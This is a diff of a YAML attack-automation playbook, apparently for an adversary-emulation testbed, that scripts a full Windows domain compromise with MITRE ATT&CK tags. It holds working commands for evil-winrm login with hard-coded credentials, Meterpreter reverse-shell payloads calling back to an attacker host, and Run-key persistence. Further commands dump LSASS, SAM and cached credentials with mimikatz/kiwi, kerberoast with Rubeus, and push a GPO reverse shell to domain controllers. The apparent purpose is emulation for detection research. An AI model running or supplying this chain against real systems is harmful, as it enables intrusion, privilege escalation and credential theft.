@@ -2,12 +2,12 @@ vars:
   DOMAIN: aecid-testbed.com
   COMPROMISED_USER_USERNAME: Alice
   COMPROMISED_USER_PASSWORD: Pa$$w0rd
-  COMPROMISED_ADMIN_USERNAME: "wsadmin"
-  COMPROMISED_ADMIN_PASSWORD: "Root.PW1"
-  COMPROMISED_ADMIN_HASH: "20f4829ff2880daba668aeac071b73db"
+  COMPROMISED_ADMIN_USERNAME: wsadmin
+  COMPROMISED_ADMIN_PASSWORD: Root.PW1
+  COMPROMISED_ADMIN_HASH: 20f4829ff2880daba668aeac071b73db
   IP_KALI: 10.10.10.200
   IP_WEB: 10.10.10.10
-  IP_DC1: 10.0.0.10
+  IP_DC1: 10.0.0.100
   PAYLOADS_DIR: /home/superuser/payloads
   MSF_PAYLOAD: windows/x64/meterpreter/reverse_tcp
 
@@ -15,19 +15,19 @@ commands:
   - type: shell
     cmd: "evil-winrm -i $IP_WEB -u $COMPROMISED_USER_USERNAME -p '$COMPROMISED_USER_PASSWORD'\n"
     command_timeout: 30
-    creates_session: winrm
+    creates_session: winrm_domain_user
     interactive: true
     metadata:
-      techniques: "T1021.006,T1047"
+      techniques: "T1021.006, T1047"
       tactics: "Lateral Movement"
       technique_name: "Remote Services: Windows Remote Management"
 
   - type: shell
-    session: winrm
+    session: winrm_domain_user
     interactive: true
     cmd: "Add-Content -Path \"C:\\Scripts\\Logger.ps1\" -Value \"net localgroup administrators alice /add\"\n"
     metadata:
-      techniques: "T1053.005,T1547"
+      techniques: "T1053.005, T1547"
       tactics: "Execution, Persistence, Privilege Escalation"
       technique_name: "Scheduled Task/Job: Scheduled Task"
 
@@ -40,29 +40,24 @@ commands:
         LHOST: $IP_KALI
         LPORT: "9001"
     format: exe
-    local_path: $PAYLOADS_DIR/msf.exe
+    local_path: $PAYLOADS_DIR/msf-9001.exe
 
   - type: shell
-    session: winrm
+    session: winrm_domain_user
     interactive: true
-    cmd: "mkdir C:\\\\Temp\n"
+    cmd: "upload $PAYLOADS_DIR/msf-9001.exe C:\\\\Users\\\\Public\\\\msf-9001.exe\n"
 
   - type: shell
-    session: winrm
+    session: winrm_domain_user
     interactive: true
-    cmd: "upload $PAYLOADS_DIR/msf.exe C:\\\\Temp\\\\msf.exe\n"
-
-  - type: shell
-    session: winrm
-    interactive: true
-    cmd: "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Persistence\" -Value \"C:\\Temp\\msf.exe\" -PropertyType \"String\" -Force\n"
+    cmd: "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Persistence\" -Value \"C:\\Users\\Public\\msf-9001.exe\" -PropertyType \"String\" -Force\n"
     metadata:
       techniques: "T1547.001"
       tactics: "Persistence, Privilege Escalation"
       technique_name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
 
   - type: msf-module
-    creates_session: msfshell
+    creates_session: msfshell_local_admin
     cmd: exploit/multi/handler
     payload: $MSF_PAYLOAD
     payload_options:
@@ -72,24 +67,24 @@ commands:
     kill_on_exit: true
 
   - type: shell
-    session: winrm
+    session: winrm_domain_user
     interactive: true
-    cmd: "C:\\\\Temp\\\\msf.exe\n"
+    cmd: "C:\\\\Users\\\\Public\\\\msf-9001.exe\n"
 
   - type: msf-session
-    session: msfshell
+    session: msfshell_local_admin
     cmd: getuid
 
   - type: msf-session
-    session: msfshell
+    session: msfshell_local_admin
     cmd: getsystem
 
   - type: msf-session
-    session: msfshell
+    session: msfshell_local_admin
     cmd: getuid
 
   - type: msf-session
-    session: msfshell
+    session: msfshell_local_admin
     cmd: pgrep lsass
 
   - type: setvar
@@ -97,7 +92,7 @@ commands:
     variable: $LSASS_PID
 
   - type: msf-session
-    session: msfshell
+    session: msfshell_local_admin
     cmd: migrate $LSASS_PID
     metadata:
       techniques: "T1055"
@@ -108,19 +103,19 @@ commands:
     seconds: 10
 
   - type: msf-session
-    session: msfshell
+    session: msfshell_local_admin
     cmd: getpid
 
   - type: msf-session
-    session: msfshell
+    session: msfshell_local_admin
     cmd: load kiwi
 
   - type: msf-session
-    session: msfshell
+    session: msfshell_local_admin
     cmd: "kiwi_cmd \"privilege::debug\""
 
   - type: msf-session
-    session: msfshell
+    session: msfshell_local_admin
     cmd: "kiwi_cmd \"sekurlsa::logonpasswords\""
     metadata:
       techniques: "T1003.001"
@@ -128,7 +123,7 @@ commands:
       technique_name: "OS Credential Dumping: LSASS Memory"
 
   - type: msf-session
-    session: msfshell
+    session: msfshell_local_admin
     cmd: "kiwi_cmd \"lsadump::cache\""
     metadata:
       techniques: "T1003.005"
@@ -136,7 +131,7 @@ commands:
       technique_name: "OS Credential Dumping: Cached Domain Credentials"
 
   - type: msf-session
-    session: msfshell
+    session: msfshell_local_admin
     cmd: "kiwi_cmd \"lsadump::sam\""
     metadata:
       techniques: "T1003.002"
@@ -144,14 +139,106 @@ commands:
       technique_name: "OS Credential Dumping: Security Account Manager"
 
   - type: shell
-    session: winrm
+    session: winrm_domain_user
     interactive: true
-    cmd: "upload $PAYLOADS_DIR/Rubeus.exe C:\\\\Temp\\\\Rubeus.exe\n"
+    cmd: "upload $PAYLOADS_DIR/Rubeus.exe C:\\\\Users\\\\Public\\\\Rubeus.exe\n"
 
   - type: msf-session
-    session: msfshell
-    cmd: "execute -f C:\\\\Temp\\\\Rubeus.exe -a \"kerberoast /nowrap\" -i"
+    session: msfshell_local_admin
+    cmd: "execute -f C:\\\\Users\\\\Public\\\\Rubeus.exe -a \"kerberoast /nowrap\" -i" # compromise 'wsadmin'
     metadata:
       techniques: "T1558.003"
       tactics: "Credential Access"
       technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
+
+  - type: shell
+    cmd: "evil-winrm -i $IP_WEB -u $COMPROMISED_ADMIN_USERNAME -p '$COMPROMISED_ADMIN_PASSWORD'\n"
+    command_timeout: 30
+    creates_session: winrm_domain_admin
+    interactive: true
+    metadata:
+      techniques: "T1021.006, T1047"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: Windows Remote Management"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "upload $PAYLOADS_DIR/SharpGPOAbuse.exe C:\\\\Users\\\\Public\\\\SharpGPOAbuse.exe\n"
+
+  - type: msf-payload
+    cmd: $MSF_PAYLOAD
+    payload_options:
+        LHOST: $IP_KALI
+        LPORT: "9002"
+    format: exe
+    local_path: $PAYLOADS_DIR/msf-9002.exe
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "upload $PAYLOADS_DIR/msf-9002.exe C:\\\\Users\\\\Public\\\\msf-9002.exe\n"
+
+  - type: msf-module
+    creates_session: msfshell_domain_admin
+    cmd: exploit/multi/handler
+    payload: $MSF_PAYLOAD
+    payload_options:
+      LHOST: $IP_KALI
+      LPORT: "9002"
+    background: true
+    kill_on_exit: true
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: |
+      $Username = '$COMPROMISED_ADMIN_USERNAME';
+      $Password = '$COMPROMISED_ADMIN_PASSWORD';
+      $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force;
+      $Credential = New-Object System.Management.Automation.PSCredential $Username, $SecurePassword;
+      $Session = New-PSSession -ComputerName DC1 -Credential $credential;
+      Copy-Item -Path C:\\Users\\Public\\SharpGPOAbuse.exe -ToSession $Session -Destination C:\\Users\\Public\\;
+      Copy-Item -Path C:\\Users\\Public\\msf-9002.exe -ToSession $Session -Destination C:\\Users\\Public\\;
+        New-GPO -name 'revshell';
+        New-GPLINK -name 'revshell' -target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com';
+        C:\\Users\\Public\\SharpGPOAbuse.exe --AddComputerTask --GPOName revshell --Author $COMPROMISED_ADMIN_USERNAME --TaskName 'revshell' --Command 'powershell.exe' --Arguments 'C:\\Users\\Public\\msf-9002.exe';
+      }\n
+    metadata:
+      techniques: "T1484.001"
+      tactics: "Defense Evasion, Privilege Escalation"
+      technique_name: "Domain or Tenant Policy Modification: Group Policy Modification"
+
+  - type: msf-session
+    session: msfshell_domain_admin
+    cmd: sysinfo
+
+  - type: msf-session
+    session: msfshell_domain_admin
+    cmd: getuid
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "upload $PAYLOADS_DIR/Invoke-NinjaCopy.ps1 C:\\\\Users\\\\Public\\\\Invoke-NinjaCopy.ps1\n"
+
+#   - type: shell
+#     session: winrm_domain_admin
+#     interactive: true
+#     cmd: |
+#       $Username = '$COMPROMISED_ADMIN_USERNAME';
+#       $Password = '$COMPROMISED_ADMIN_PASSWORD';
+#       $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force;
+#       $Credential = New-Object System.Management.Automation.PSCredential $Username, $SecurePassword;
+#       $Session = New-PSSession -ComputerName localhost -Credential $credential;
+#       C:\\Users\\Public\\Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\ntds.dit" -ComputerName DC1 -LocalDestination "C:\Users\Public\ntds.dit"
+#       # https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-NinjaCopy/Invoke-NinjaCopy.ps1
+#     metadata:
+#       techniques: "T1006"
+#       tactics: "Defense Evasion"
+#       technique_name: "Direct Volume Access"
+
+#   - type: shell
+#     session: winrm_domain_admin
+#     interactive: true
+#     cmd: "download C:\\\\Users\\\\Public\\\\ntds.dit\n"
